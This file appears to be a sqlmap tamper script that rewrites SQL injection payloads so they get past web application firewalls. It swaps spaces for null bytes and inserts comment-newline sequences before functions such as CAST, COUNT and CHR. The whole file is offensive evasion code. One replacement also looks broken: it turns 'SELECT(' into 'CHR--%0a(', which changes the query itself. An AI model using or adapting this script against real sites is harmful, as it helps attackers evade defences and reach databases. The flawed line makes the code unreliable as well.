#!/usr/bin/env python
import  re
"""
write by kill02lc
"""
from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING

__priority__ = PRIORITY.LOW


def dependencies():
    pass
def tamper(payload,**kwargs):
    if payload:
        payload = payload.replace(" ", "%00")
        payload = payload.replace("VARCHAR(", "VARCHAR--%0a(")
        payload = payload.replace("CAST(", "CAST--%0a(")
        payload = payload.replace("COUNT(", "COUNT--%0a(")
        payload = payload.replace("CHR(", "CHR--%0a(")
        payload = payload.replace("SELECT(", "CHR--%0a(")
        payload = payload.replace("WNER", "WNER--%0a")

    return payload

